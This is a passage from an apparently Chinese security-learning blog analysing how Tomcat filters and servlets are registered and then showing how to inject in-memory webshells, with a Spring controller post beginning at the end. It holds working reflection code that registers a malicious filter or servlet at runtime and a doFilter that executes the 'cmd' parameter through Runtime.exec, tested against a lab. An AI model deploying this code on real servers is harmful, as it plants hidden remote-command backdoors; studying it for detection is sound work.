<li>Filter：称之为过滤器，在用户处理类之前的，用来对请求进行额外处理提供额外功能的类；是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</li>
</ul>
<h3 id="filter调用栈">filter调用栈</h3>
<p>老样子，先在tomcat中创建一个filter看看是怎么执行的</p>
<pre><code class="language-java">package test;

import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class testFilter implements Filter {

    //tomcat启动，或者context重新加载的时候调用init（先destroy再init）
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println(&quot;FirstFilter init...&quot;);
    }
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        //request到达的时候执行下面的代码
        System.out.println(&quot;FirstFilter request&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;);
        //转给过滤器链中的下一个filter，如果是最后一个filter，调用要访问的资源
        chain.doFilter(request, response);
        //要访问的资源访问完以后，response到达的时候执行下面的代码
        System.out.println(&quot;FirstFilter response&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;);

    }
    //tomcat关闭或者context重新加载的时候调用destroy
    public void destroy() {
        System.out.println(&quot;FirstFilter destroy...&quot;);
    }
}

</code></pre>
<p>在这里<code>System.out.println(&quot;FirstFilter request&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;);</code>打断点。得到调用栈</p>
<pre><code class="language-java">doFilter:23, testFilter (test)
internalDoFilter:194, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:544, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:143, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>在internalDoFilter中我们看到直接调用了filter.doFilter方法，此时的filter已经是testFilter了</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/TxiFX9"><img src="https://s4.ax1x.com/2022/01/06/TxiFX9.png" alt="TxiFX9.png" loading="lazy"></a></figure>
<p>并且观察到来源于ApplicationFilterConfig</p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/TxiE01"><img src="https://s4.ax1x.com/2022/01/06/TxiE01.png" alt="TxiE01.png" loading="lazy"></a></figure>
<p>暂时放下继续往上跟踪,发现<code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code>会被<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>方法调用。在invoke方法的位置调用<code>filterChain.doFilter</code>，对请求进行过滤操作。</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/TximtK"><img src="https://s4.ax1x.com/2022/01/06/TximtK.png" alt="TximtK.png" loading="lazy"></a></figure>
<p>而filterChain这个属性又是invoke方法内的<code>ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</code>创建的一个过滤链，将<code>request, wrapper, servlet</code>进行传递</p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/TxinfO"><img src="https://s4.ax1x.com/2022/01/06/TxinfO.png" alt="TxinfO.png" loading="lazy"></a></figure>
<p>继续跟踪createFilterChain函数，发现首先从上下文里寻找并且返回一个FilterMap数组，这里的context就是StandardContext</p>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/TxiQ6H"><img src="https://s4.ax1x.com/2022/01/06/TxiQ6H.png" alt="TxiQ6H.png" loading="lazy"></a></figure>
<p>然从遍历这个数组， 通过if来匹配filterMap里filer设置的过滤url地址是否和前端请求匹配, 如果匹配的话, 先通过filerMap获取fiter名, 然后再去StandardContext里获取filter名对应的filterConfig，如果成功获取到filterConfig, 则将filterConfig添加到filterChain中</p>
<figure data-type="image" tabindex="20"><a href="https://imgtu.com/i/Txi3nA"><img src="https://s4.ax1x.com/2022/01/06/Txi3nA.png" alt="Txi3nA.png" loading="lazy"></a></figure>
<p>context里的filterConfig又是怎么来的呢。我们继续跟进去看看，filterConfigs是一个hashmap，初始化的时候 从配置(就是手动配置的那个web.xml文件)文件中封装了filterDef等属性，filterDef里面就是我们配置的filter</p>
<p>所以整体层级结构为：<font color="red"><code>standardcontext</code>-&gt;<code>filterConfigs(Map)</code>-&gt;<code>filterConfig</code>-&gt;<code>filterDef</code>-&gt;<code>Filter</code>。</font></p>
<figure data-type="image" tabindex="21"><a href="https://imgtu.com/i/TxiNh8"><img src="https://s4.ax1x.com/2022/01/06/TxiNh8.png" alt="TxiNh8.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="22"><a href="https://imgtu.com/i/TxiwcQ"><img src="https://s4.ax1x.com/2022/01/06/TxiwcQ.png" alt="TxiwcQ.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="23"><a href="https://imgtu.com/i/Txis7q"><img src="https://s4.ax1x.com/2022/01/06/Txis7q.png" alt="Txis7q.png" loading="lazy"></a></figure>
<h3 id="分析">分析</h3>
<p>根据上面的源码分析我们可以看到如果我们想要动态的注册一个filter，只需要<strong>将自创建的 <code>Filter</code> 放到 <code>context.filterConfigs</code> 属性中，并在 <code>context.filterMaps</code> 中增加一个 <code>filterName</code> 和 <code>URL</code> 的映射，即可完成动态注册一个Filter。</strong></p>
<p>而且standardcontext中已经帮我们写好了方法，所以我们要做的是构造filter的属性</p>
<figure data-type="image" tabindex="24"><a href="https://imgtu.com/i/TxiR9U"><img src="https://s4.ax1x.com/2022/01/06/TxiR9U.png" alt="TxiR9U.png" loading="lazy"></a></figure>
<p>所以我们第一步是获取standardcontext</p>
<pre><code class="language-java">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<p>第二步，设置filterConfigs,这里利用反射的方式取出私有属性</p>
<pre><code class="language-java">Field Configs = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;filterConfigs&quot;);
Configs.setAccessible(true);
</code></pre>
<p>第三步，获取当前的filterConfigs也即过滤链,然后实例一个我们自己的恶意filter</p>
<pre><code class="language-java">Map filterConfigs = (Map) Configs.get(standardContext);
Filter filter = new cmd_Filters();
</code></pre>
<p>第四步，构造filterdef和filterMap</p>
<pre><code class="language-java">//构造filterdef
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);//这里是上面谈过的standardcontext给出的add方法
//构造filterMap
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern(&quot;/*&quot;);//这个url是我们在filter类之前申明的过滤url,@WebFilter(&quot;/*&quot;)
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);//这里也是上面谈过的standardcontext给出的add方法
</code></pre>
<p>第五步，getDeclaredConstructor返回构造对象，参数就是构造对象的参数。说人话就是ApplicationFilterConfig这个类存在构造函数用于实例化的时候初始化数据，可以通过.class.getDeclaredConstructor的方式使用这个类的构造函数。结果是一样的。</p>
<pre><code class="language-java">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);//最后使用newInstance实例化
</code></pre>
<p>为什么不直接new一个？因为对于无访问权限修饰符修饰的方法，只有在同一个包下的类可以访问。所以直接new ApplicationFilterConfig会报错</p>
<figure data-type="image" tabindex="25"><a href="https://imgtu.com/i/TxiW3F"><img src="https://s4.ax1x.com/2022/01/06/TxiW3F.png" alt="TxiW3F.png" loading="lazy"></a></figure>
<p>第六步:注册,和上文分析的StandardContext.filterStart中一致，直接把我们完成组装的信息put进filterConfigs就行.这里已经完成了对恶意Filter的注册</p>
<figure data-type="image" tabindex="26"><a href="https://imgtu.com/i/Txifc4"><img src="https://s4.ax1x.com/2022/01/06/Txifc4.png" alt="Txifc4.png" loading="lazy"></a></figure>
<pre><code class="language-java">filterConfigs.put(name,filterConfig);
</code></pre>
<p>最后doFilter中写回显的逻辑。这里不再赘述</p>
<pre><code class="language-java">public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
		HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        String cmd=&quot;whoami&quot;;
        cmd= request.getParameter(&quot;cmd&quot;);
        String res=new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
        response.getOutputStream().println(res);
        response.flushBuffer();
        chain.doFilter(request, response);
    }
</code></pre>
<h3 id="效果">效果</h3>
<figure data-type="image" tabindex="27"><a href="https://imgtu.com/i/TxioH1"><img src="https://s4.ax1x.com/2022/01/06/TxioH1.png" alt="TxioH1.png" loading="lazy"></a></figure>
<h2 id="servlet-内存马">servlet 内存马</h2>
<blockquote>
<p><a href="https://www.baidu.com/s?wd=MVC%E6%A1%86%E6%9E%B6&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">MVC框架</a>里头的C，Controller的角色，当客户从页面传入参数请求的时候，发送到<a href="https://so.csdn.net/so/search?q=Servlet">Servlet</a>，Servlet根据请求的不同，分配给不同的业务代码完成业务操作，操作完成后，Servlet返回一个结果到页面上面去。</p>
</blockquote>
<h3 id="servlet-调用栈">servlet  调用栈</h3>
<p>还是先写个servletdemo看看在源码中怎么运行的</p>
<pre><code class="language-java">package test;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = &quot;testServlet&quot;,urlPatterns = {&quot;/my/*&quot;})
public class testServlet implements Servlet{
    private transient ServletConfig servletConfig;
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        this.servletConfig = servletConfig;
    }
    @Override
    public ServletConfig getServletConfig() {
        return servletConfig;
    }
    @Override
    public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        String output=&quot;it is a servlet&quot;;
        response.setContentType(&quot;text/html&quot;);
        PrintWriter out = response.getWriter();
        out.println(output);
        out.flush();
        out.close();
    }
    @Override
    public String getServletInfo() {
        return &quot;My Servlet&quot;;
    }
    @Override
    public void destroy() {
    }
}
</code></pre>
<p>在service()方法中打入断点得到调用栈</p>
<pre><code class="language-java">service:24, testServlet (test)
internalDoFilter:232, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:194, ApplicationFilterChain (org.apache.catalina.core)
doFilter:167, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:544, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:143, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>这时候发现，internalDoFilter这个玩意不就是我们之前在学习Filter时所见到的东西吗。再仔细一看，这不就是我们上文所说的，当过滤链走完最终就达到servlet方法吗。与此同时，这里的this.servlet已经是testservlet这个我们自己写的demo了。</p>
<figure data-type="image" tabindex="28"><a href="https://imgtu.com/i/TxiHN6"><img src="https://s4.ax1x.com/2022/01/06/TxiHN6.png" alt="TxiHN6.png" loading="lazy"></a></figure>
<p>那么这个servlet是怎么来的呢，我们继续往上跟发现同一个类下的doFilter方法调用了internalDoFilter跟servlet的设置没有关系，再继续往上</p>
<figure data-type="image" tabindex="29"><a href="https://imgtu.com/i/TxizDA"><img src="https://s4.ax1x.com/2022/01/06/TxizDA.png" alt="TxizDA.png" loading="lazy"></a></figure>
<p>继续往上发现还是filter链的前面的filter的方法，跟servlet的设置还是没关系，继续往上走，直到StandardWrapperValve的invoke方法，这里还是很眼熟，是之前说过的构造过滤链的方法。</p>
<figure data-type="image" tabindex="30"><a href="https://imgtu.com/i/TxFCUP"><img src="https://s4.ax1x.com/2022/01/06/TxFCUP.png" alt="TxFCUP.png" loading="lazy"></a></figure>
<p>找到filterChain的来源发现绑定了我们的servlet的进去</p>
<figure data-type="image" tabindex="31"><a href="https://imgtu.com/i/Tx3A2j"><img src="https://s4.ax1x.com/2022/01/06/Tx3A2j.png" alt="Tx3A2j.png" loading="lazy"></a></figure>
<p>跟进createFilterchain，setServlet这个方法就在刚刚的ApplicationFilterChain类中</p>
<figure data-type="image" tabindex="32"><a href="https://imgtu.com/i/Tx3mq0"><img src="https://s4.ax1x.com/2022/01/06/Tx3mq0.png" alt="Tx3mq0.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="33"><a href="https://imgtu.com/i/Tx3uZV"><img src="https://s4.ax1x.com/2022/01/06/Tx3uZV.png" alt="Tx3uZV.png" loading="lazy"></a></figure>
<p>这就是在filter链最后执行的servlet的来源，那么我们绑定进去的servlet又是怎么设置的呢。回到StandardWrapperValve继续往上跟踪</p>
<p>发现servlet的来源是wrapper。wrapper这个玩意儿也很熟悉了，在前置知识中讲过，他是servlet的封装，可以视为servlet。</p>
<figure data-type="image" tabindex="34"><a href="https://imgtu.com/i/Tx33RJ"><img src="https://s4.ax1x.com/2022/01/06/Tx33RJ.png" alt="Tx33RJ.png" loading="lazy"></a></figure>
<p>同样也是前文说过，context是wrapper的上一级，那么是不是可以用context来控制wrapper呢，答案也是可以的</p>
<p>参考下面的文章</p>
<blockquote>
<p>https://blog.csdn.net/iteye_14395/article/details/82541546</p>
</blockquote>
<p>直接去找standardcontext的createWrapper方法，这里直接略过寻找的过程直接给结论，在启动tomcat的过程中</p>
<p>在 <code>org.apache.catalina.startup</code>的configureContext方法的Wrapper wrapper = this.context.createWrapper()处打断点得到如下调用栈，注意是启动之前打断点，然后启动的过程中得到</p>
<pre><code class="language-java">configureContext:1282, ContextConfig (org.apache.catalina.startup)
webConfig:1115, ContextConfig (org.apache.catalina.startup)
configureStart:779, ContextConfig (org.apache.catalina.startup)
lifecycleEvent:299, ContextConfig (org.apache.catalina.startup)
fireLifecycleEvent:123, LifecycleBase (org.apache.catalina.util)
startInternal:5130, StandardContext (org.apache.catalina.core)
start:183, LifecycleBase (org.apache.catalina.util)
addChildInternal:755, ContainerBase (org.apache.catalina.core)
addChild:729, ContainerBase (org.apache.catalina.core)
addChild:695, StandardHost (org.apache.catalina.core)
..........................................................//省略
run:748, Thread (java.lang)
</code></pre>
<p>可以在configureContext的代码中看到启动过程中从tomcat的配置文件web.xml读取servlet，通过循环将每个servlet塞进wrapper中，最后再把wrapper塞进this.context,这个context就是standardcontext</p>
<pre><code class="language-java">		var35 = webxml.getServlets().values().iterator();
        while(var35.hasNext()) {
            ServletDef servlet = (ServletDef)var35.next();
            Wrapper wrapper = this.context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup());
            }

            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled());
            }

            wrapper.setName(servlet.getServletName());
            Map&lt;String, String&gt; params = servlet.getParameterMap();
            var7 = params.entrySet().iterator();

           .........................................//省略

            wrapper.setOverridable(servlet.isOverridable());
            this.context.addChildwrapper);
        }
</code></pre>
<p><code>webxml.getServlets().values().iterator();</code>获取web.xml中servlet的配置，然后判断是否存在下一个servlet。</p>
<p>可以看到在964行this.context.createWrapper()创建了wrapper，后续就是将配置文件中的servlet赛进wrapper中</p>
<figure data-type="image" tabindex="35"><a href="https://imgtu.com/i/Tx3Ys1"><img src="https://s4.ax1x.com/2022/01/06/Tx3Ys1.png" alt="Tx3Ys1.png" loading="lazy"></a></figure>
<p>1017行this.context.addChild(wrapper);将wrapper增加进context中。循环读取后这里已经是我们的testservlet了。</p>
<figure data-type="image" tabindex="36"><a href="https://imgtu.com/i/Tx3dIO"><img src="https://s4.ax1x.com/2022/01/06/Tx3dIO.png" alt="Tx3dIO.png" loading="lazy"></a></figure>
<p>把servlet的配置塞进去后，下面代码中还配置了ServletMappings。</p>
<figure data-type="image" tabindex="37"><a href="https://imgtu.com/i/Tx3DRH"><img src="https://s4.ax1x.com/2022/01/06/Tx3DRH.png" alt="Tx3DRH.png" loading="lazy"></a></figure>
<p>至于mapping是什么一看便知</p>
<figure data-type="image" tabindex="38"><a href="https://imgtu.com/i/Tx32eP"><img src="https://s4.ax1x.com/2022/01/06/Tx32eP.png" alt="Tx32eP.png" loading="lazy"></a></figure>
<p>此时已经完成了servlet的初始化，然后再回到刚开始的demoservlet。此时发起请求</p>
<pre><code class="language-url">http://localhost:8090/tomcatweb_war_exploded/my/
</code></pre>
<p>在<code>org.apache.catalina.connector</code>的CoyoteAdapter中的service方法中打下断点，它的作用是从coyote的request和response得到connector的request和response并且使他们之间互相链接.接下来是通过<strong>postParseRequest</strong>来解析请求的参数,<strong>查找context</strong>。这里就找到了我们的wrapper。简单点来说，<strong>这里通过http请求找到了我们之前分配的wrapper</strong></p>
<blockquote>
<p>PS: 这里也可以看出CoyoteAdapter的作用是连接器Connector和容器Container的桥梁.毕竟完成了类型的转换分配</p>
</blockquote>
<figure data-type="image" tabindex="39"><a href="https://imgtu.com/i/Tx3hFS"><img src="https://s4.ax1x.com/2022/01/06/Tx3hFS.png" alt="Tx3hFS.png" loading="lazy"></a></figure>
<p>然后一路跟进就来到了最开始的地方。至此，整个servlet的创建访问过程已经分析完毕</p>
<figure data-type="image" tabindex="40"><a href="https://imgtu.com/i/Tx35WQ"><img src="https://s4.ax1x.com/2022/01/06/Tx35WQ.png" alt="Tx35WQ.png" loading="lazy"></a></figure>
<h3 id="分析-2">分析</h3>
<p>经过观察servlet的初始化流程我们可以得到standardcontext是整个流程中的重中之重，只需要我们构建一个wrapper然后使用，standardContext.addchild()方法即可插入我们自己的servlet。</p>
<p>首先获取standardcontext</p>
<pre><code class="language-java">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<p>实例化恶意servlet方便后面绑定,反射调用standardcontext.createWrapper()，这是之前在tomcat启动时使用过的</p>
<pre><code class="language-java">tomcat_servlet greetServlet = new tomcat_servlet();
Method createWrapper = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;createWrapper&quot;);
Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);
</code></pre>
<p>反射调用内置的方法搓wrapper的属性，setname设置servlet的名字。setLoadOnStartup简单来说就是设置servlet的启动级别</p>
<pre><code class="language-java">Method gname = Container.class.getDeclaredMethod(&quot;setName&quot;, String.class);
gname.invoke(greetWrapper,&quot;shell&quot;);
Method gload = Wrapper.class.getDeclaredMethod(&quot;setLoadOnStartup&quot;, int.class);
gload.invoke(greetWrapper,1);
Method gservlet = Wrapper.class.getDeclaredMethod(&quot;setServlet&quot;, Servlet.class);
gservlet.invoke(greetWrapper,greetServlet);
Method gclass = Wrapper.class.getDeclaredMethod(&quot;setServletClass&quot;, String.class);
gclass.invoke(greetWrapper,greetServlet.getClass().getName());
</code></pre>
<p>最后反射调用standardContext的addchild方法,绑定mapping信息</p>
<pre><code class="language-java">Method gchild = StandardContext.class.getDeclaredMethod(&quot;addChild&quot;,Container.class);
gchild.invoke(standardContext,greetWrapper);
Method gmap = StandardContext.class.getDeclaredMethod(&quot;addServletMappingDecoded&quot;,String.class,String.class,boolean.class);
gmap.invoke(standardContext,&quot;/shell&quot;, &quot;shell&quot;,false);
</code></pre>
<p>然后就是servlet的编写，按照格式来就行。在service中写下回显的逻辑即可</p>
<h3 id="效果-2">效果</h3>
<p>依旧是spring+log4j的靶场，注入恶意类之后可以看到能在我们的恶意servlet所绑定的shell路径下执行命令</p>
<figure data-type="image" tabindex="41"><a href="https://imgtu.com/i/Tx3TQs"><img src="https://s4.ax1x.com/2022/01/06/Tx3TQs.gif" alt="Tx3TQs.gif" loading="lazy"></a></figure>
<p>参考文章</p>
<blockquote>
<p>https://www.cnblogs.com/nice0e3/p/14622879.html#0x02-%E8%BF%87%E6%BB%A4%E9%93%BE%E5%88%86%E6%9E%90</p>
<p>https://forum.ywhack.com/viewthread.php?tid=115869&amp;highlight=%E5%86%85%E5%AD%98%E9%A9%AC</p>
<p>https://www.cnblogs.com/liliqiang/articles/8006816.html</p>
<p>https://blog.csdn.net/qq_34101364/article/details/120856415</p>
<p>https://github.com/ce-automne/TomcatMemShell</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Spring controller 内存马]]></title>
        <id>https://ja9er.github.io/post/spring-controller-nei-cun-ma/</id>
        <link href="https://ja9er.github.io/post/spring-controller-nei-cun-ma/">
        </link>
        <updated>2021-12-24T10:08:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="spring-controller-内存马学习">Spring controller 内存马学习</h1>
<blockquote>
<p><em>PS 菜鸟学习，有不正确之处还望斧正</em></p>
</blockquote>
<h2 id="0x01-开始之前">0X01 开始之前</h2>
<p>需要我们了解什么是内存马？</p>
<p>在新手阶段我们简单的将其定义为</p>
<blockquote>
<p>访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果</p>
</blockquote>
<p>思考一下在这其中的所需要实现的功能，现在来看就是两个需求</p>
<blockquote>
<ol>
<li>需要一个受控的url</li>
<li>受控的url接受传参数，且返回响应的结果</li>
</ol>
</blockquote>
<p>在解决这些需求之前，先了解一下MVC结构</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/TYIEVg"><img src="https://s4.ax1x.com/2021/12/24/TYIEVg.png" alt="TYIEVg.png" loading="lazy"></a></figure>
<p>通俗的来说，Controller就是胶水层，负责接收请求，分配给对应的逻辑层处理结果，得出结果之后响应给渲染层</p>
<p>打开靶场的源码可以看到UserController这个类，不难看出，这里注册路由，然后分配给路由对应的执行方法，这就是所谓的Controller</p>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/user&quot;)
public class UserController {
    @Autowired
    private UserService userService;
    /**
     * 注册
     * @param user 参数封装
     * @return Result
     */
    @PostMapping(value = &quot;/regist&quot;)
    public Result regist(User user){
        return userService.regist(user);
    }
    /**
     * 登录
     * @param user 参数封装
     * @return Result
     */
    @PostMapping(value = &quot;/login&quot;)
    public Result login(User user){
        return userService.login(user);
    }
}
</code></pre>
<p>所以对应的两个需求，都可以在Controller中解决。这也是被称为Spring  Controller 内存马的原因</p>
<p>面对需求我们需要做到以下三点。</p>
<blockquote>
<ol>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；</li>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；</li>
<li>controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；</li>
</ol>
</blockquote>
<h2 id="0x02-调试">0x02 调试</h2>
<p>按照环境搭建靶场</p>
<p>配置一个springboot+log4j+mybits靶场</p>
<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
<h3 id="0x02-01-怎么获取上下文">0X02-01 怎么获取上下文?</h3>
<blockquote>
<p>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境</p>
</blockquote>
<p>在spring中有4种方式能获得当前的上下文环境(context)，上下文可以简单理解为web端处理这个请求时，当前线程内所拥有的各种环境信息和资源。</p>
<h4 id="方法一getcurrentwebapplicationcontext"><strong>方法一</strong>：getCurrentWebApplicationContext</h4>
<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
</code></pre>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/TYIkqS"><img src="https://s4.ax1x.com/2021/12/24/TYIkqS.png" alt="TYIkqS.png" loading="lazy"></a></figure>
<p>在spring boot中无法获取</p>
<h4 id="方法二webapplicationcontextutils"><strong>方法二</strong>：WebApplicationContextUtils</h4>
<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
</code></pre>
<p><strong>拆解分析</strong></p>
<p><strong>(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()</strong></p>
<p>在SpringMVC的源代码中提供了一个封装过的ThreadLocal，ThreadLocal就是当前线程的本地存储对象，在每个线程中都创建了一个 ThreadLocalMap 对象，每个线程可以访问自己内部 ThreadLocalMap 对象内的 value。其中保存了每次请求的HttpServletRequest对象</p>
<p>其实就是上面代码中的<strong>RequestContextHolder</strong></p>
<blockquote>
<p>RequestContextHolder：请求上下文持有者，他是通过ThreadLocal放入当前请求线程中的，通过他的静态方法getRequestAttributes可以获取到RequestAttributes，如果我们是web项目，那么他的子类就是ServletRequestAttributes。</p>
</blockquote>
<p>现在将其理解为<font color="orange">RequestContextHolder是Spring提供的可以获取HttpServletRequest的一个工具</font></p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/TYImPs"><img src="https://s4.ax1x.com/2021/12/24/TYImPs.png" alt="TYImPs.png" loading="lazy"></a></figure>
<p>通过((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()就拿到咱们的request对象了。</p>
<p><strong>RequestContextUtils.getWebApplicationContext</strong></p>
<p>拿到request对象后再来看看这个函数，顾名思义，一看就是获取Web上下文的地方</p>
<p>看看源码</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/TYIu2q"><img src="https://s4.ax1x.com/2021/12/24/TYIu2q.png" alt="TYIu2q.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/TYInGn"><img src="https://s4.ax1x.com/2021/12/24/TYInGn.png" alt="TYInGn.png" loading="lazy"></a></figure>
<p>终于在<font color="red">request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE)</font>这里拿到了<code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code>的webapplicationContext。</p>
<p>DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE的值的来源是DispatcherServlet初始化的时候</p>
<pre><code class="language-java">public static final String WEB_APPLICATION_CONTEXT_ATTRIBUTE = DispatcherServlet.class.getName() + &quot;.CONTEXT&quot;;
</code></pre>
<blockquote>
<p>PS 这个函数实际已经拿到了上下文，这也就是为什么方法三能简略到方法二的原因</p>
</blockquote>
<p><strong>提出疑问，为什么能从request中获取上下文呢?</strong></p>
<p>还是要回到Spring MVC 的结构中的<code>DispatcherServlet</code></p>
<p>DispatcherServlet是spring框架实现的前端控制器。作为一个Servlet，所有的 Web 请求都需要通过它来处理，进行转发，匹配，数据处理后，并转由页面进行展现，它可以说是 SpringMVC 最核心的部分。除此之外 SpringMVC 还有不同的 HandlerMapping 映射策略，各种 Controller 控制器的实现，各种视图解析，拦截器，LocalResolver 国际化处理。</p>
<p>在完成对 ContextLoaderListener 的初始化后，Web 容器开始初始化 DispatcherServlet。 DispatcherServlet 会建立自己的上下文来持有SpringMVC的Bean 对象，过程是首先从 ServletContext 中获 取上下文作为自己的父上下文，再对自己的上下文进行初始化，最后存储到 ServletContext 中。</p>
<p>可以在下图中看到DispatcherServlet继承了FrameworkServlet</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/TYIQMV"><img src="https://s4.ax1x.com/2021/12/24/TYIQMV.png" alt="TYIQMV.png" loading="lazy"></a></figure>
<p>在FrameworkServlet中存在<strong>processRequest</strong>方法，利用该方法重写了doget(),doPost()等servlet该有的方法</p>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/TYIlrT"><img src="https://s4.ax1x.com/2021/12/24/TYIlrT.png" alt="TYIlrT.png" loading="lazy"></a></figure>
<p>我们可以根据processRequest方法看出:<strong>initContextHolders</strong>绑定了request和localeContext，这也就是为什么</p>
<p>request能取出上下文的原因</p>
<pre><code class="language-java">protected final void processRequest(HttpServletRequest request, HttpServletResponse response)
throws ServletException, IOException {
